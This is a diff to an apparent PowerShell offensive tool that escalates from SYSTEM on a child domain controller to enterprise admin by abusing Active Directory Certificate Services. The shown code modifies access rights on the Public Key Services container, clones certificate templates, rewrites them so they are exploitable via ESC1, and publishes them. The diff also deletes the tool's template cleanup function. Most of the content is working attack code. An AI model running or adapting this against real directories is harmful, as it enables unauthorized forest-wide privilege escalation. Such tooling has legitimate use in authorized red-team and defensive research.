@@ -36,75 +36,34 @@ https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c
 https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/
 
 Example Usage:
-Import-Module .\PKIEscalate
 
-# Perform escalation, optionally installing ADCS
-Invoke-Escalation -Username GANON -TemplateName SneakyTemplate [-InstallAdcs] [-CAName]
-
-# Remove the template that was added for exploitation
-Clear-Template -TemplateName SneakyTemplate -CAName HYRULE-CA
+# Perform escalation
+Invoke-Escalation -Username GANON -TemplateName SneakyTemplate
 #>
 
+# Import AD module
+Import-Module ActiveDirectory
 
-function Invoke-SystemCheck {
-<#
-.SYNOPSIS
+function Is-SystemAccount {
+    try {
+        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+        $isSystem = $currentUser.IsSystem
 
-Checks the current user running the script is NT AUTHORITY\SYSTEM
-
-.DESCRIPTION
-
-The exploit requires the SYSTEM user in order to modify the CA and templates.
-
-#>
-    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());
-    if ($currentPrincipal.Identity.Name -ne "NT AUTHORITY\SYSTEM") {
-        echo "[!] You are not SYSTEM. Exiting..."
-    }
-    else {
-        echo "[*] We are NT AUTHORITY\SYSTEM! Continuing..."     
+        if ($isSystem) {
+            Write-Output "[+] You are SYSTEM. Continuing ..."
+            return $true
+        } else {
+            Write-Output "[!] You are NOT SYSTEM. Stopping attack ..."
+            return $false
+            exit
+        }
+    } catch {
+        Write-Error "An error occurred: $_"
+        return $false
+        exit
     }
 }
 
-
-function Install-ADCS {
-<#
-.SYNOPSIS
-
-Installs the Active Directory Certificate Service on the child domain.
-
-
-.DESCRIPTION
-
-Uses the administrative ability on the child domain, in a child -> parent structure (multi-tiered or single-tier) to
-install ADCS and set up a malicious certificate authority. This gets propagated up to the root domain. Only used if
-ADCS is not already present in the environment.
-
-
-.PARAMETER CAName
-
-The name of the CA you wish to install.
-
-
-.RETURNS 
-
-[String] Name of the Certificate Authority
-
-#>
-    Param (
-       [Parameter(Position = 0, Mandatory=$true)]
-       [String]
-       $CAName
-    )
-
-    # Install ADCS
-    Install-WindowsFeature AD-Certificate, ADCS-Cert-Authority -IncludeManagementTools
-
-    # Add CA
-    Install-AdcsCertificationAuthority -CAType EnterpriseRootCA -CACommonName $CAName -Force
-
-    return $CAName
-}
 
 function Modify-Template {
 <#
@@ -331,74 +290,6 @@ The CA Name (Used for filtering AD objects).
 }
 
 
-function Clear-Template {
-<#
-.SYNOPSIS
-
-Deletes a specified template from the certificate store.
-
-
-.DESCRIPTION
-
-Removes (ideally) the added certificate template. Pass the same name as passed when originally performing the exploit.
-Caution: With SYSTEM privileges you can delete any other existing templates. Take care when passing the template
-name to this function.
-
-
-.PARAMETER TemplateName
-
-The template name that should be deleted from the certificate store. The template itself does not get removed! 
-Just actively removed from the live template available.
-
-
-.PARAMETER CAName
-
-The name of the Certificate Authority (Used for filtering)
-
-
-.RETURNS 
-
-[Bool] $true / $false
-
-#>
-    Param (
-        [Parameter(Position = 0, Mandatory=$true)]
-        [String]
-        $TemplateName,
-
-        [Parameter(Position = 1, Mandatory=$true)]
-        [String]
-        $CAName
-    )
-
-    $Tld =  [System.Net.Dns]::GetHostEntry([string]$env:computername).HostName.Split('.')[-1]
-    $RootDomain =  [System.Net.Dns]::GetHostEntry([string]$env:computername).HostName.Split('.')[-2]
-
-    # Remove the template from the store
-    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
-    $ConfigContext = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$ConfigContext"
-    $filter = "(cn=$CAName)"
-    $ds = New-object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ConfigContext",$filter)
-    $CAObject = $ds.Findone().GetDirectoryEntry()
-    # Since arrays cannot have their length modified straight in PowerShell, I'll create a fresh
-    # array list, remove the template, then convert back to a System.Object.Array and completely
-    # repopulate the variable with the updated list
-    [System.Collections.ArrayList]$NewTemplateList = $CAObject.Properties['certificateTemplates'].Value
-    $NewTemplateList.Remove("$TemplateName")
-    $ArrayTemplateList = $NewTemplateList.ToArray()
-    $CAObject.Properties['certificateTemplates'].Value = $ArrayTemplateList
-    $CAObject.commitchanges()
-
-    $DeleteTemplate = ((1..20 | %{ '{0:X}' -f (Get-Random -Max 16) }) -Join '') + ".ldf"
-    Add-Content -Path $DeleteTemplate -Value "dn: CN=$TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=$RootDomain,DC=$Tld"
-    Add-Content -Path $DeleteTemplate -Value "changetype: delete"
-
-    # Delete the template from the CA itself via the CA's certificateTempates.Value property
-    ldifde -i -v -f $DeleteTemplate
-    del $DeleteTemplate
-
-}
-
 function Modify-PublicKeyServicesContainer {
 <#
 .SYNOPSIS
@@ -412,11 +303,6 @@ The Public Key Services container (CN=Public Key Services) grants the SYSTEM use
 underlying Enrollment Services container (CN=Enrollment Services), which specifically contains the pKIEnrollmentService
 class, does not. However, since inheritence is allowed on the object, if we can modify the "This object only" to 
 "This object and its descendants" then we'll have full control, and therefore be able to modify the container/enable templates!
-
-.RETURNS 
-
-TODO: Add checks
-
 #>
 
     $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
@@ -438,6 +324,7 @@ TODO: Add checks
     $PKSObject.commitchanges()
 }
 
+
 function Invoke-Escalation {
 <#
 .SYNOPSIS
@@ -449,7 +336,7 @@ Encompassing function to perform the exploit. This is the main function that you
 
 The function works in multiple stages:
 - Identify if the SYSTEM user is running the script
-- Install ADCS and add a Certificate Authority (CA) // Get current ADCS details and CA name
+- Get current ADCS details and CA name
 - Lists available templates and copies one into a temporary .ldf file
 - Modifies the copied template to be vulnerable to ESC1
 - Imports the modified template to the certificate store - This gets propogated into the root certificate store
@@ -468,21 +355,9 @@ The username that you wish to grant ESC1 abuse for. No need to pass the domain.
 The name of the template that will be added for ESC1 abuse.
 
 
-.PARAMETER InstallAdcs
-
-If ADCS is not installed in the target environment, this will install it on the writeable domain controller 
-that you have SYSTEM on.
-
-
-.PARAMETER CAName
-
-If a new ADCS service is being installed, a CA name must be specified. If left blank, this
-will be set to a random hexadecimal string.
-
-
 .EXAMPLE
 
-Invoke-Escalation -Username Heartburn -TemplateName SneakyTemplate [-InstallAdcs] [-CAName]
+Invoke-Escalation -Username Heartburn -TemplateName SneakyTemplate
 
 
 .RETURNS
@@ -497,40 +372,21 @@ Invoke-Escalation -Username Heartburn -TemplateName SneakyTemplate [-InstallAdcs
 
        [Parameter(Position = 1, Mandatory=$true)]
        [String]
-       $TemplateName,
+       $TemplateName
 
-       [Switch]
-       $InstallAdcs = $false,
-
-       [String]
-       $CAName = $false
     )
     
     # Check whether we are running as SYSTEM
-    Invoke-SystemCheck
+    Is-SystemAccount
 
     # Environment initialization
-    # TODO: There should be a better way of doing this - I don't like relying on environment variables not being messed with.
     $Tld =  [System.Net.Dns]::GetHostEntry([string]$env:computername).HostName.Split('.')[-1]
-    $RootDomain =  [System.Net.Dns]::GetHostEntry([string]$env:computername).HostName.Split('.')[-2]
-    $ChildDomain = $env:USERDomain
-    echo "[*] We are in running the exploit on user $ChildDomain\$Username which will propagate up to the $RootDomain.$Tld root domain!"
-
-    if ($InstallAdcs) {
-        echo "[*] Installing ADCS and creating CA $CAName..."
-        Install-ADCS $CAName
-    }
-    else {
-        # TODO: Ascertain the main CA in use before running this
-        # TODO: This MAY fail if there is more than one CA! Needs testing.
-        # Get the current CA name
-        $ConfigCtx = ([ADSI]"LDAP://RootDSE").configurationNamingContext
-        $ConfigCtx = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$ConfigCtx"
-        $wildcard = "(cn=*)"
-        $dsSearch = New-object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ConfigCtx",$wildcard)
-        $CaNameContainer = $dsSearch.Findone().GetDirectoryEntry()
-        $CAName = $CaNameContainer.Children.Name
-    }
+    $RootDomain =  Get-ADForest | select -ExpandProperty RootDomain
+    $ChildDomain = Get-ADDomain | select -ExpandProperty NetBIOSName
+    echo "[+] We are in running the exploit on user $ChildDomain\$Username which will propagate up to the $RootDomain.$Tld root domain !"
+    # Get the current CA name
+    $CAName = (Get-ADObject -Filter 'ObjectClass -eq "pKIEnrollmentService"' -SearchBase (Get-ADRootDSE).ConfigurationNamingContext).Name
+    
     
     # Get a list of existing templates to find one to make a clone of
     $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
@@ -540,7 +396,6 @@ Invoke-Escalation -Username Heartburn -TemplateName SneakyTemplate [-InstallAdcs
     $PKSObject = $ds.Findone().GetDirectoryEntry()
     $TemplateList = $PKSObject.certificateTemplates
     # Check that there are templates found to make a copy from
-    # TODO: Try to create a static template so we can continue in environments that have ADCS but no templates published?
     if ($TemplateList.count -lt 1) {
         echo "[!] No templates have been found to copy! Maybe there is none in use in the environment. Exiting..."
         sleep 5
@@ -575,8 +430,6 @@ Invoke-Escalation -Username Heartburn -TemplateName SneakyTemplate [-InstallAdcs
     if (Enable-Template -TemplateName $TemplateName -CAName $CAName) {
         echo "[*] All done! User should now be able to exploit ESC1."
         echo "[*] Certipy command to check: certipy find -vulnerable -scheme ldap -u $Username -p <password> -dc-ip <DC-IP>"
-        # Caveat - Needs more testing
-        echo "[*] Clean up the added template with: Clear-Template -TemplateName $TemplateName -CAName $CAName"
     }
     else {
         echo "[!] Something went wrong when enabling the template!"
